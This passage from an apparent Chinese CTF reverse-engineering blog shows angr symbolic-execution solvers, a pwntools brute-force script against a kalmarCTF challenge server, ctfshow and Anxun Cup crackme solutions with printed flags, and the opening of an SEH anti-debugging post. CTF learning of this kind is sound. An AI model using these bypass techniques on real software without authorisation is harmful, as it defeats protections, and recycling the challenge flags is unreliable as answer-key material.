src="/2023/03/08/reverse-angr%E5%AD%A6%E4%B9%A0-%E6%9E%84%E9%80%A0%E5%A0%86%E6%A0%88/image-20230308182304092.png" alt="image-20230308182304092"></p><p>也可以往回逆</p><p><img src="/2023/03/08/reverse-angr%E5%AD%A6%E4%B9%A0-%E6%9E%84%E9%80%A0%E5%A0%86%E6%A0%88/image-20230308182400030.png" alt="image-20230308182400030"></p><p>接下来就简单了</p><p>构造模拟器 设置find以及avoid</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sm = b.factory.simulation_manager(s)</span><br><span class="line">sm.explore(find=<span class="number">0x40106b</span>, avoid=<span class="number">0x401072</span>)</span><br></pre></td></tr></tbody></table></figure><p>最后输出就好了</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">found_state = sm.found[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(found_state.solver.<span class="built_in">eval</span>(found_state.memory.load(<span class="number">0x402159</span>, <span class="number">40</span>), cast_to=<span class="built_in">bytes</span>).strip(<span class="string">b'\0'</span>)</span><br></pre></td></tr></tbody></table></figure><p>整理一下exp</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">p = angr.Project(<span class="string">'./very_success'</span>, auto_load_libs=<span class="literal">False</span>)</span><br><span class="line">state = p.factory.blank_state(addr=<span class="number">0x401084</span>)</span><br><span class="line"></span><br><span class="line">state.memory.store(state.regs.esp+<span class="number">12</span>, state.solver.BVV(<span class="number">40</span>, state.arch.bits))</span><br><span class="line"><span class="comment"># 输入的数据的地址</span></span><br><span class="line">state.mem[state.regs.esp+<span class="number">8</span>:].dword = <span class="number">0x402159</span> </span><br><span class="line"><span class="comment"># 函数调用前[ebp - 10]存放的地址</span></span><br><span class="line">state.mem[state.regs.esp+<span class="number">4</span>:].dword = <span class="number">0x4010E4</span> </span><br><span class="line"><span class="comment"># call之后eip的地址</span></span><br><span class="line">state.mem[state.regs.esp:].dword = <span class="number">0x401064</span>   </span><br><span class="line"></span><br><span class="line">state.memory.store(<span class="number">0x402159</span>, state.solver.BVS(<span class="string">"ans"</span>, <span class="number">40</span>*<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">simgr = p.factory.simulation_manager(state)</span><br><span class="line">simgr.explore(find=<span class="number">0x40106B</span>, avoid=<span class="number">0x401072</span>)</span><br><span class="line"></span><br><span class="line">found = simgr.found[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">return</span> found.solver.<span class="built_in">eval</span>(found.memory.load(<span class="number">0x402159</span>, <span class="number">40</span>), cast_to=<span class="built_in">bytes</span>).strip(<span class="string">b'\0'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"><span class="built_in">print</span>(main())</span><br></pre></td></tr></tbody></table></figure><p><img src="/2023/03/08/reverse-angr%E5%AD%A6%E4%B9%A0-%E6%9E%84%E9%80%A0%E5%A0%86%E6%A0%88/image-20230308182704771.png" alt="image-20230308182704771"></p><p>ok</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p><strong>构造堆栈的核心： 找到函数调用前的exp情况和调用后的esp的情况以及输入的地址</strong></p><p>本题结束  感谢观看</p><p>Orz</p></body></html>]]></content>
      
      
      
        <tags>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kalmarCTF逆向区部分WP</title>
      <link href="/2023/03/06/reverse-kalmarCTF%E9%83%A8%E5%88%86WP/"/>
      <url>/2023/03/06/reverse-kalmarCTF%E9%83%A8%E5%88%86WP/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>第一次 打国际赛</p><p>只能说  太有意思啦（难死我吧）:sob:  :sob:  :sob:</p><p>首先对师傅们  及 我自己 说句</p><p><img src="/2023/03/06/reverse-kalmarCTF%E9%83%A8%E5%88%86WP/image-20230306100919179.png" alt="image-20230306100919179"></p><p>不管怎么样  我会好好努力学习的</p><p>:grin: :grin: :grin: :grin: :grin: :grin:</p><p>然后的话   不管怎么说都学到了一点东西</p><p>单拿题目来讲  队里师傅出了第一个<a href="https://kalmarc.tf/challenges#CycleChaser-32">CycleChaser</a></p><p>笔者呢  就对这道领悟的还算…</p><p>(我太菜辣  Orz  Orz)</p><p>不瞎掰扯了    看题</p><p><strong>有所错误， 望指正   诚心希望大家能指明是否有误</strong></p><p><strong>笔者万分感谢   （Orz）</strong></p><h1 id="CycleChaser"><a href="#CycleChaser" class="headerlink" title="CycleChaser"></a>CycleChaser</h1><p>查壳  运行（不能运行）</p><p>拖入ida分析</p><p><img src="/2023/03/06/reverse-kalmarCTF%E9%83%A8%E5%88%86WP/image-20230306103937516.png" alt="image-20230306103937516"></p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>这就是 关键部分</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">v16 = malloc(0x4009uLL);                      // malloc分配0x4009空间来存放上面所作的操作 - 理解位初始化也可以</span><br><span class="line"> <span class="keyword">if</span> ( !v16 )</span><br><span class="line"> {</span><br><span class="line">   puts(<span class="string">"Error."</span>);</span><br><span class="line">   <span class="built_in">exit</span>(6);</span><br><span class="line"> }</span><br><span class="line"> <span class="keyword">if</span> ( fread(v16, 1uLL, 0x4009uLL, stdin) != 0x4009 )</span><br><span class="line"> {</span><br><span class="line">   puts(<span class="string">"Error."</span>);</span><br><span class="line">   <span class="built_in">exit</span>(7);</span><br><span class="line"> }</span><br><span class="line"> v17 = calloc(0x40uLL, 1uLL);                  // calloc分配64空间 作为true_flag</span><br><span class="line"> <span class="keyword">for</span> ( j = 0; j &lt;= 0x2003F; ++j )</span><br><span class="line"> {</span><br><span class="line">   <span class="keyword">if</span> ( j &gt; 0x1FFFF )</span><br><span class="line">   {</span><br><span class="line">     v5 = *(_BYTE *)((j &amp; <span class="number">0</span>x3F) + v15);        // v5 为 下面异或key</span><br><span class="line">                                               // v15 为 {}中间 - input</span><br><span class="line">   }</span><br><span class="line">   else</span><br><span class="line">   {</span><br><span class="line">     LOWORD(n_4) = rand() &amp; <span class="number">0</span>x3FF;</span><br><span class="line">     n_4 = (unsigned __int16)n_4;</span><br><span class="line">     v5 = *((_BYTE *)v12 + (unsigned __int16)n_4);// v5是随机出来的</span><br><span class="line">   }</span><br><span class="line">   if ( (unsigned __int8)step(v16, <span class="number">0</span>x4009LL) ) // step函数作为关键call</span><br><span class="line">     *((_BYTE *)v17 + (j &amp; <span class="number">0</span>x3F)) ^= v5;</span><br><span class="line"> }</span><br><span class="line"> <span class="keyword">for</span> ( k = 0; k &lt;= 0x3F; ++k )</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"%0X "</span>, *((unsigned __int8 *)v17 + k));// 输出true_flag - v17</span><br></pre></td></tr></tbody></table></figure><p>好的 引用队内是师傅的思路就是</p><blockquote><p>应该是用符号执行找到一个input使得可以在循环的前0x20000次中都让step返回0，再后续的0x3F次中都返回1</p></blockquote><p><strong>意思就是  说  下面那个 异或的 关键call</strong></p><p><strong>让true_flag ^ 1 = 不可控的数</strong></p><p><strong>而前面空间  ^ 0 = 可控的数（这个数本身）</strong></p><p>example</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = <span class="number">10</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a ^ <span class="number">0</span></span><br><span class="line"><span class="number">10</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a ^ <span class="number">1</span></span><br><span class="line"><span class="number">11</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = <span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b ^ <span class="number">0</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b ^ <span class="number">1</span></span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></tbody></table></figure><p><img src="/2023/03/06/reverse-kalmarCTF%E9%83%A8%E5%88%86WP/image-20230306104245640.png" alt="image-20230306104245640"></p><p>然后的话  我想用angr跑一下  试试</p><p>但笔者学到的都是皮毛</p><p>并没有什么结果</p><p>后面看师傅的angr 脚本 （只能看懂  我写不出来 Orz）</p><p>也没有跑出来结果  大概是 少加了什么约束条件吧</p><p><img src="/2023/03/06/reverse-kalmarCTF%E9%83%A8%E5%88%86WP/image-20230306110203932.png" alt="image-20230306110203932"></p><p>贴一下(以后仿写  嘿嘿)</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr, claripy</span><br><span class="line"><span class="keyword">import</span> sys, time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">argv</span>):</span><br><span class="line">    <span class="comment">#project </span></span><br><span class="line">    path_to_binary = <span class="string">"cyclechaser"</span></span><br><span class="line">    p = angr.Project(path_to_binary)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#state</span></span><br><span class="line">    start_address = <span class="number">0x4019D7</span></span><br><span class="line">    initial_state = p.factory.blank_state(</span><br><span class="line">        addr = start_address,</span><br><span class="line">        add_options = { angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY,</span><br><span class="line">                        angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS }</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="comment">#stack's construct &amp; layout</span></span><br><span class="line">    initial_state.regs.rbp = initial_state.regs.rsp</span><br><span class="line">    initial_state.regs.rsp -= <span class="number">0xF0</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#input's symbolic express</span></span><br><span class="line">    input_size = <span class="number">0x4009</span></span><br><span class="line">    <span class="built_in">input</span> = claripy.BVS(<span class="string">'input'</span>, input_size * <span class="number">8</span>)</span><br><span class="line">    pointer_to_input = initial_state.regs.rsp + <span class="number">0x40</span></span><br><span class="line">    fake_heap_addr_input = <span class="number">0x30000000</span></span><br><span class="line">    initial_state.memory.store(fake_heap_addr_input, <span class="built_in">input</span>)</span><br><span class="line">    initial_state.memory.store(pointer_to_input, fake_heap_addr_input)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#other's symbolic express</span></span><br><span class="line">    flag_size = <span class="number">64</span></span><br><span class="line">    out_size = <span class="number">64</span></span><br><span class="line">    buf_size = <span class="number">0x400</span></span><br><span class="line">    flag = claripy.BVV(<span class="number">0</span>, flag_size * <span class="number">8</span>)</span><br><span class="line">    out = claripy.BVV(<span class="number">0</span>, out_size * <span class="number">8</span>)</span><br><span class="line">    buf = claripy.BVV(<span class="number">0</span>, buf_size * <span class="number">8</span>)</span><br><span class="line">    fake_heap_addr_flag = <span class="number">0x40000000</span></span><br><span class="line">    fake_heap_addr_out = <span class="number">0x50000000</span></span><br><span class="line">    fake_heap_addr_buf = <span class="number">0x60000000</span></span><br><span class="line">    pointer_to_flag = initial_state.regs.rsp + <span class="number">0x38</span></span><br><span class="line">    pointer_to_out = initial_state.regs.rsp + <span class="number">0x48</span></span><br><span class="line">    pointer_to_buf = initial_state.regs.rsp + <span class="number">0x20</span></span><br><span class="line">    initial_state.memory.store(fake_heap_addr_flag, flag)</span><br><span class="line">    initial_state.memory.store(fake_heap_addr_out, out)</span><br><span class="line">    initial_state.memory.store(fake_heap_addr_buf, buf)</span><br><span class="line">    initial_state.memory.store(pointer_to_flag, fake_heap_addr_flag)</span><br><span class="line">    initial_state.memory.store(pointer_to_out, fake_heap_addr_out)</span><br><span class="line">    initial_state.memory.store(pointer_to_buf, fake_heap_addr_buf)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># cnt = claripy.BVV(0, 32)</span></span><br><span class="line">    <span class="comment"># initial_state.memory.store(initial_state.regs.rsp + 0x10, cnt)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#define some func here</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">found</span>(<span class="params">simgr</span>):</span><br><span class="line">        <span class="keyword">if</span> simgr.found:</span><br><span class="line">            solution_state = simgr.found[<span class="number">0</span>]</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">'success'</span>)</span><br><span class="line">            solution  = solution_state.solver.<span class="built_in">eval</span>(<span class="built_in">input</span>, cast_to=<span class="built_in">bytes</span>).decode()</span><br><span class="line">            solution = <span class="string">' '</span>.join(<span class="built_in">map</span>(<span class="string">'{}'</span>.<span class="built_in">format</span>, [ solution]))</span><br><span class="line">            <span class="built_in">print</span>(solution)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">'not solution'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#define some addr here</span></span><br><span class="line">    find_addr = <span class="number">0x4019E7</span></span><br><span class="line">    avoid_addr = [<span class="number">0x40192C</span>, <span class="number">0x401478</span>, <span class="number">0x401510</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment">#explore</span></span><br><span class="line">    simgr = p.factory.simulation_manager(initial_state)</span><br><span class="line">    simgr.explore(find=find_addr, avoid=avoid_addr)</span><br><span class="line">    found(simgr)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    start = time.time()</span><br><span class="line"></span><br><span class="line">    main(sys.argv)</span><br><span class="line"></span><br><span class="line">    end = time.time()</span><br><span class="line">    total = end - start</span><br><span class="line">    <span class="built_in">print</span>(total)</span><br></pre></td></tr></tbody></table></figure><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p>然后  师傅写出来暴破的脚本</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">real_flag = <span class="built_in">bytearray</span>([<span class="number">0</span>] * <span class="number">64</span>)</span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line"></span><br><span class="line">    r = remote(<span class="string">'3.123.91.129'</span>, <span class="number">13339</span>)</span><br><span class="line">    <span class="comment"># r = process('./cyclechaser')</span></span><br><span class="line"></span><br><span class="line">    seed = r.recvline()</span><br><span class="line">    <span class="built_in">print</span>(seed) </span><br><span class="line"></span><br><span class="line">    r.sendline(<span class="string">b'\x00'</span> * (<span class="number">0x4009</span> - n) + <span class="string">b'\x01'</span> * n)</span><br><span class="line"></span><br><span class="line">    result = r.recvline()</span><br><span class="line">    result = result.split(<span class="string">b' '</span>)</span><br><span class="line">    flag = <span class="built_in">bytearray</span>(<span class="string">b''</span>)</span><br><span class="line">    <span class="keyword">for</span> res <span class="keyword">in</span> result:</span><br><span class="line">        flag += <span class="built_in">bytes</span>([<span class="built_in">int</span>(res.decode(), <span class="number">16</span>)])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">        <span class="keyword">if</span> real_flag[i] == <span class="number">0</span> <span class="keyword">and</span> flag[i] != <span class="number">0</span>:</span><br><span class="line">            real_flag[i] = flag[i]</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(real_flag)</span><br></pre></td></tr></tbody></table></figure><p>比赛closed了  然后 就不贴flag了</p><p>需要的师傅自己去跑一下吧</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>比赛挺好</p><p>好的  本文结束</p><p>感谢观看 Orz</p><p>Orz</p></body></html>]]></content>
      
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>reverse-有意思的题目</title>
      <link href="/2023/03/02/reverse-%E6%9C%89%E6%84%8F%E6%80%9D%E7%9A%84%E9%A2%98%E7%9B%AE/"/>
      <url>/2023/03/02/reverse-%E6%9C%89%E6%84%8F%E6%80%9D%E7%9A%84%E9%A2%98%E7%9B%AE/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>第一道题是 某高校第五届“安洵杯”上的题</p><p><del><u>还是《偷》的别人原题</u></del>，   什么成分  不说了</p><p>但是我没看出来  还卡了很久</p><p>看来还是做的少了</p><p>还有  是今年主办方  确实有点拉</p><p>期待最后一天的发挥</p><p>（今天是比赛第二天  话说平台为啥还没有维护好）</p><h1 id="ctfshow-re4（有意思的模运算）"><a href="#ctfshow-re4（有意思的模运算）" class="headerlink" title="ctfshow - re4（有意思的模运算）"></a>ctfshow - re4（有意思的模运算）</h1><p>查壳  运行</p><p><img src="/2023/03/02/reverse-%E6%9C%89%E6%84%8F%E6%80%9D%E7%9A%84%E9%A2%98%E7%9B%AE/image-20230302091033749.png" alt="image-20230302091033749"></p><p><img src="/2023/03/02/reverse-%E6%9C%89%E6%84%8F%E6%80%9D%E7%9A%84%E9%A2%98%E7%9B%AE/image-20230302091134732.png" alt="image-20230302091134732"><img src="/2023/03/02/reverse-%E6%9C%89%E6%84%8F%E6%80%9D%E7%9A%84%E9%A2%98%E7%9B%AE/image-20230302091135981.png" alt="image-20230302091135981"></p><p>了解了  拖入ida64分析</p><p>（md 想试试angr  结果win还不会搞）</p><p>嘎</p><p><img src="/2023/03/02/reverse-%E6%9C%89%E6%84%8F%E6%80%9D%E7%9A%84%E9%A2%98%E7%9B%AE/image-20230302101230853.png" alt="image-20230302101230853"></p><p><img src="/2023/03/02/reverse-%E6%9C%89%E6%84%8F%E6%80%9D%E7%9A%84%E9%A2%98%E7%9B%AE/image-20230302101551680.png" alt="image-20230302101551680"></p><p><img src="/2023/03/02/reverse-%E6%9C%89%E6%84%8F%E6%80%9D%E7%9A%84%E9%A2%98%E7%9B%AE/image-20230302101733670.png" alt="image-20230302101733670"></p><p>都注释好了  自行观看吧</p><p>贴exp</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -26 * (i /26) 就是 % 26</span></span><br><span class="line"></span><br><span class="line">table = <span class="string">')(*&amp;^%489$!057@#&gt;&lt;:2163qwe'</span></span><br><span class="line">cipher = <span class="string">'/..v4p$$!&gt;Y59-'</span></span><br><span class="line"></span><br><span class="line">d = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher)):</span><br><span class="line">    d += <span class="built_in">chr</span>(<span class="built_in">ord</span>(cipher[i]) ^ <span class="number">7</span>)</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line">d = <span class="string">'())q3w##&amp;9^2&gt;*'</span></span><br><span class="line"></span><br><span class="line">c = <span class="built_in">str</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(d)):</span><br><span class="line">    c = table.index(d[i])</span><br><span class="line">    <span class="built_in">print</span>(c, end=<span class="string">', '</span>)</span><br><span class="line">c = [<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">23</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">19</span>, <span class="number">16</span>, <span class="number">2</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">flag = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">    flag *= <span class="number">26</span></span><br><span class="line">    flag += c[i]</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># 2484524302484524302</span></span><br></pre></td></tr></tbody></table></figure><p><img src="/2023/03/02/reverse-%E6%9C%89%E6%84%8F%E6%80%9D%E7%9A%84%E9%A2%98%E7%9B%AE/image-20230302102113681.png" alt="image-20230302102113681"></p><p>然后说一下  卡住我的地方  就是那个取模的那</p><h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">a = 1</span><br><span class="line">a + -26 * (a//26)</span><br><span class="line">输出1</span><br><span class="line"></span><br><span class="line">a = 2</span><br><span class="line">a + -26 * (a//26)</span><br><span class="line">输出2</span><br><span class="line"></span><br><span class="line">太有意思了</span><br></pre></td></tr></tbody></table></figure><p><img src="/2023/03/02/reverse-%E6%9C%89%E6%84%8F%E6%80%9D%E7%9A%84%E9%A2%98%E7%9B%AE/image-20230302101925634.png" alt="image-20230302101925634"></p><h1 id="第五届安洵杯-第二天上的题"><a href="#第五届安洵杯-第二天上的题" class="headerlink" title="第五届安洵杯 第二天上的题"></a>第五届安洵杯 第二天上的题</h1><h1 id="re4"><a href="#re4" class="headerlink" title="re4"></a>re4</h1><ol><li><p>查字符串  出了</p></li><li><p>010 查 flag同样出</p></li><li><p>还有ida动调出个序列号<code>iKunLove</code></p></li></ol><p>运行一样出flag</p><p><img src="/2023/03/02/reverse-%E6%9C%89%E6%84%8F%E6%80%9D%E7%9A%84%E9%A2%98%E7%9B%AE/image-20230302100035401.png" alt="image-20230302100035401"></p><p><code>flag{woshiikun666}</code></p><h1 id="猜数字"><a href="#猜数字" class="headerlink" title="猜数字"></a>猜数字</h1><p>动调  暴破 改跳转</p><p>出了</p><p><code>flag{1uck_g4y_n0t_n55d_x0r}</code></p><p>具体一点</p><p>动调</p><p><img src="/2023/03/02/reverse-%E6%9C%89%E6%84%8F%E6%80%9D%E7%9A%84%E9%A2%98%E7%9B%AE/image-20230302100213625.png" alt="image-20230302100213625"></p><p><img src="/2023/03/02/reverse-%E6%9C%89%E6%84%8F%E6%80%9D%E7%9A%84%E9%A2%98%E7%9B%AE/image-20230302100310897.png" alt="image-20230302100310897"></p><p><img src="/2023/03/02/reverse-%E6%9C%89%E6%84%8F%E6%80%9D%E7%9A%84%E9%A2%98%E7%9B%AE/image-20230302100415218.png" alt="image-20230302100415218"></p><p><img src="/2023/03/02/reverse-%E6%9C%89%E6%84%8F%E6%80%9D%E7%9A%84%E9%A2%98%E7%9B%AE/image-20230302100720938.png" alt="image-20230302100720938"></p><p><img src="/2023/03/02/reverse-%E6%9C%89%E6%84%8F%E6%80%9D%E7%9A%84%E9%A2%98%E7%9B%AE/image-20230302100727358.png" alt="image-20230302100727358"></p></body></html>]]></content>
      
      
      
        <tags>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>reverse-反调试-异常处理|tea</title>
      <link href="/2023/02/28/reverse-%E5%8F%8D%E8%B0%83%E8%AF%95-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86-tea/"/>
      <url>/2023/02/28/reverse-%E5%8F%8D%E8%B0%83%E8%AF%95-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86-tea/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>异常常用于动态反调试技术。正常运行的进程发生异常时，在**SEH(Structured Exception  Handling)**机制的作用下，OS会接收异常，然后调用进程中注册的SEH处理。但是，若进程正被调试器调试，那么调试器就会先于SEH接收处理。利用该特征可判断进程是正常运行还是调试运行，然后根据不同的结果执行不同的操作，这就是利用异常处理机制不同的反调试原理。</p><p>上面回答  好官方 呃呃</p><p>下面我就一道题来讲解</p><h1 id="NewStarCTF-week4-exception"><a href="#NewStarCTF-week4-exception" class="headerlink" title="NewStarCTF week4 - exception"></a>NewStarCTF week4 - exception</h1><p>一看题目  就是考察异常处理的</p><p>（题目算法就一个tea加密）</p><p>拖入ida静态分析</p><p><img src="/2023/02/28/reverse-%E5%8F%8D%E8%B0%83%E8%AF%95-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86-tea/image-20230228101328765.png" alt="image-20230228101328765"></p><p><img src="/2023/02/28/reverse-%E5%8F%8D%E8%B0%83%E8%AF%95-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86-tea/image-20230228101253061.png" alt="image-20230228101253061"></p><p>跟进35100A</p><p><img src="/2023/02/28/reverse-%E5%8F%8D%E8%B0%83%E8%AF%95-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86-tea/image-20230228101435562.png" alt="image-20230228101435562"></p><p>搜一下贴一下（看不懂 ）</p><p><a href="https://blog.csdn.net/u011279649/article/details/12840937">https://blog.csdn.net/u011279649/article/details/12840937</a></p><p>对于这道题  就是干扰我们得到delta</p><p>动调一下</p><p><img 